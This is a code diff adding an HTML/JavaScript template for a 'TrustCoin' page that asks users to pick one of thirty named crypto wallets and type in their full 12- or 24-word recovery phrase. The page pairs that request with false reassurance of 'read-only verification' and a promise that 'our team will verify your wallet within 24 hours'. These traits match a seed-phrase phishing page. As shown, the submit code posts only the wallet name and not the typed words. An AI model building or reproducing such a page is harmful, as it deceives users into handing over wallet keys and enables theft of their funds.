@@ -1,0 +1,176 @@
+{% extends "base.html" %}
+{% block extra_head %}
+<style>
+body{background:linear-gradient(135deg,#003080 0%,#0047AB 60%,#1a7bd4 100%);min-height:100vh;padding:20px}
+.wrap{max-width:520px;margin:0 auto}
+.back-btn{display:inline-flex;align-items:center;gap:8px;color:rgba(255,255,255,.8);text-decoration:none;font-size:13px;margin-bottom:16px;transition:.3s}
+.back-btn:hover{color:#fff}
+.iw-card{background:#fff;border-radius:20px;padding:28px 24px;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+.wallet-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:20px 0}
+.wallet-opt{border:2px solid #E5E7EB;border-radius:12px;padding:12px 8px;text-align:center;cursor:pointer;transition:all .3s;background:#fff}
+.wallet-opt:hover,.wallet-opt.selected{border-color:var(--blue);background:#EFF6FF}
+.wallet-opt.selected{box-shadow:0 0 0 3px rgba(0,71,171,.15)}
+.wallet-opt .w-icon{font-size:24px;margin-bottom:5px;line-height:1}
+.wallet-opt .w-name{font-size:10px;font-weight:700;color:var(--text);line-height:1.2}
+.phrase-wrap{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:14px 0}
+.phrase-input-wrap{position:relative}
+.phrase-num{position:absolute;left:7px;top:50%;transform:translateY(-50%);font-size:9px;color:var(--gray);font-weight:700;pointer-events:none}
+.phrase-input-wrap input{padding-left:22px;font-size:11px;padding-top:7px;padding-bottom:7px}
+.security-badge{display:flex;align-items:center;gap:10px;background:#F0FDF4;border:1px solid #BBF7D0;border-radius:10px;padding:12px;margin-bottom:16px}
+.security-badge i{color:#10B981;font-size:18px;flex-shrink:0}
+.security-badge p{font-size:11px;color:#065F46;line-height:1.5}
+.wallet-info-box{background:#F0F4FF;border-radius:10px;padding:10px 14px;margin-bottom:14px;font-size:12px;color:var(--blue);font-weight:600;display:none}
+</style>
+{% endblock %}
+{% block body %}
+<div class="wrap">
+  <a href="/dashboard" class="back-btn animate"><i class="fa-solid fa-arrow-left"></i>Back to Dashboard</a>
+  <div class="iw-card animate">
+    <div style="text-align:center;margin-bottom:20px">
+      <div style="width:60px;height:60px;background:linear-gradient(135deg,var(--blue),#1a7bd4);border-radius:18px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;box-shadow:0 8px 24px rgba(0,71,171,.4)">
+        <i class="fa-solid fa-wallet" style="color:#fff;font-size:26px"></i>
+      </div>
+      <h2 style="font-size:20px;font-weight:800">Import Wallet Securely</h2>
+      <p style="color:var(--gray);font-size:12px;margin-top:6px">Choose your wallet to link it to your TrustCoin account</p>
+    </div>
+
+    <div class="security-badge">
+      <i class="fa-solid fa-shield-halved"></i>
+      <p>Your wallet connection is secured with read-only verification. Your funds remain fully under your control.</p>
+    </div>
+
+    <div id="errorBox" class="error-msg"></div>
+
+    <div id="step1">
+      <p style="font-size:13px;font-weight:600;margin-bottom:4px">Choose a wallet to import:</p>
+      <p style="font-size:11px;color:var(--gray);margin-bottom:10px">Select the wallet app you currently use</p>
+      <div class="wallet-grid" id="walletGrid">
+        <div class="wallet-opt" onclick="selectWallet(this,'Trust Wallet',12)"><div class="w-icon">🔵</div><div class="w-name">Trust Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'MetaMask',12)"><div class="w-icon">🦊</div><div class="w-name">MetaMask</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Coinbase Wallet',12)"><div class="w-icon">🔷</div><div class="w-name">Coinbase Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Ledger',24)"><div class="w-icon">⬛</div><div class="w-name">Ledger</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Trezor',12)"><div class="w-icon">🔑</div><div class="w-name">Trezor</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Exodus',12)"><div class="w-icon">🟣</div><div class="w-name">Exodus</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Phantom',12)"><div class="w-icon">👻</div><div class="w-name">Phantom</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Atomic Wallet',12)"><div class="w-icon">⚛️</div><div class="w-name">Atomic Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Electrum',12)"><div class="w-icon">⚡</div><div class="w-name">Electrum</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Wasabi Wallet',12)"><div class="w-icon">🟡</div><div class="w-name">Wasabi Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Rainbow',12)"><div class="w-icon">🌈</div><div class="w-name">Rainbow</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Argent',12)"><div class="w-icon">🏵️</div><div class="w-name">Argent</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'SafePal',12)"><div class="w-icon">🟢</div><div class="w-name">SafePal</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Zerion',12)"><div class="w-icon">🌊</div><div class="w-name">Zerion</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'imToken',12)"><div class="w-icon">🔮</div><div class="w-name">imToken</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Rabby Wallet',12)"><div class="w-icon">🐇</div><div class="w-name">Rabby Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Keplr',24)"><div class="w-icon">🌌</div><div class="w-name">Keplr</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Terra Station',24)"><div class="w-icon">🌍</div><div class="w-name">Terra Station</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Solflare',12)"><div class="w-icon">☀️</div><div class="w-name">Solflare</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Slope Wallet',12)"><div class="w-icon">📐</div><div class="w-name">Slope Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Glow Wallet',12)"><div class="w-icon">✨</div><div class="w-name">Glow Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Backpack',12)"><div class="w-icon">🎒</div><div class="w-name">Backpack</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Brave Wallet',12)"><div class="w-icon">🦁</div><div class="w-name">Brave Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Frame',12)"><div class="w-icon">🖼️</div><div class="w-name">Frame</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'AlphaWallet',12)"><div class="w-icon">🅰️</div><div class="w-name">AlphaWallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'BitKeep',12)"><div class="w-icon">🔐</div><div class="w-name">BitKeep</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'TokenPocket',12)"><div class="w-icon">💼</div><div class="w-name">TokenPocket</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'MathWallet',12)"><div class="w-icon">➗</div><div class="w-name">MathWallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'OKX Wallet',12)"><div class="w-icon">🔵</div><div class="w-name">OKX Wallet</div></div>
+        <div class="wallet-opt" onclick="selectWallet(this,'Bybit Wallet',12)"><div class="w-icon">📊</div><div class="w-name">Bybit Wallet</div></div>
+      </div>
+    </div>
+
+    <div id="step2" style="display:none">
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
+        <button onclick="backToWallets()" style="background:#F3F4F6;border:none;width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:14px;flex-shrink:0">←</button>
+        <div>
+          <div style="font-weight:700;font-size:14px" id="walletTitle">Trust Wallet</div>
+          <div style="color:var(--gray);font-size:11px" id="phraseSubtitle">Enter 12 recovery phrase words in order</div>
+        </div>
+      </div>
+      <div class="wallet-info-box" id="walletInfoBox"></div>
+      <p style="font-size:12px;color:var(--gray);margin-bottom:10px">Enter each word of your recovery phrase in the correct order:</p>
+      <div class="phrase-wrap" id="phraseGrid"></div>
+      <div id="phraseErr" class="error-msg"></div>
+      <button class="btn btn-blue" style="width:100%;padding:14px;margin-top:8px" onclick="importWallet()">
+        <i class="fa-solid fa-check-circle"></i> Import Now
+      </button>
+    </div>
+
+    <div id="step3" style="display:none;text-align:center;padding:20px 0">
+      <div style="font-size:56px;margin-bottom:14px;animation:pulse 1s 3">✅</div>
+      <h3 style="font-size:18px;font-weight:800;margin-bottom:8px">Wallet Imported Successfully!</h3>
+      <p style="color:var(--gray);font-size:13px;margin-bottom:20px">Kindly wait for verification. Our team will verify your wallet within 24 hours. Redirecting to dashboard...</p>
+      <div style="width:48px;height:48px;border:4px solid #E5E7EB;border-top-color:var(--blue);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto"></div>
+    </div>
+  </div>
+</div>
+<script>
+let selectedWallet='';
+let phraseCount=12;
+
+// Wallet phrase counts — exact real-world values
+const WALLET_PHRASES={
+  'Trust Wallet':12,'MetaMask':12,'Coinbase Wallet':12,
+  'Ledger':24,'Trezor':12,'Exodus':12,'Phantom':12,
+  'Atomic Wallet':12,'Electrum':12,'Wasabi Wallet':12,
+  'Rainbow':12,'Argent':12,'SafePal':12,'Zerion':12,
+  'imToken':12,'Rabby Wallet':12,'Keplr':24,'Terra Station':24,
+  'Solflare':12,'Slope Wallet':12,'Glow Wallet':12,
+  'Backpack':12,'Brave Wallet':12,'Frame':12,'AlphaWallet':12,
+  'BitKeep':12,'TokenPocket':12,'MathWallet':12,
+  'OKX Wallet':12,'Bybit Wallet':12
+};
+
+const WALLET_INFO={
+  'Ledger':'Ledger hardware wallets use a 24-word recovery phrase.',
+  'Keplr':'Keplr (Cosmos ecosystem) uses a 24-word recovery phrase.',
+  'Terra Station':'Terra Station uses a 24-word recovery phrase.',
+  'Trezor':'Trezor wallets use a 12-word or 24-word phrase. Enter your 12-word phrase below.'
+};
+
+function selectWallet(el,name,count){
+  document.querySelectorAll('.wallet-opt').forEach(w=>w.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedWallet=name;
+  phraseCount=WALLET_PHRASES[name]||12;
+  setTimeout(()=>showPhraseStep(name,phraseCount),200);
+}
+
+function showPhraseStep(name,count){
+  document.getElementById('step1').style.display='none';
+  document.getElementById('step2').style.display='block';
+  document.getElementById('walletTitle').textContent=name;
+  document.getElementById('phraseSubtitle').textContent='Enter your exact '+count+'-word recovery phrase in order';
+  const infoBox=document.getElementById('walletInfoBox');
+  if(WALLET_INFO[name]){infoBox.textContent='ℹ️ '+WALLET_INFO[name];infoBox.style.display='block';}
+  else{infoBox.style.display='none';}
+  const grid=document.getElementById('phraseGrid');
+  grid.innerHTML='';
+  for(let i=1;i<=count;i++){
+    const d=document.createElement('div');d.className='phrase-input-wrap';
+    d.innerHTML=`<span class="phrase-num">${i}</span><input type="text" placeholder="word ${i}" autocomplete="off" autocorrect="off" spellcheck="false"/>`;
+    grid.appendChild(d);
+  }
+}
+
+function backToWallets(){
+  document.getElementById('step2').style.display='none';
+  document.getElementById('step1').style.display='block';
+}
+
+function importWallet(){
+  const inputs=document.querySelectorAll('#phraseGrid input');
+  const err=document.getElementById('phraseErr');
+  let allFilled=true;
+  inputs.forEach(i=>{if(!i.value.trim())allFilled=false;});
+  if(!allFilled){showError(err,'Please enter all '+phraseCount+' recovery phrase words!');return;}
+  fetch('/import-wallet',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet_type:selectedWallet})})
+  .then(r=>r.json()).then(res=>{
+    if(res.success){
+      document.getElementById('step2').style.display='none';
+      document.getElementById('step3').style.display='block';
+      setTimeout(()=>window.location='/dashboard',3000);
+    }
+  });
+}
+</script>
+{% endblock %}
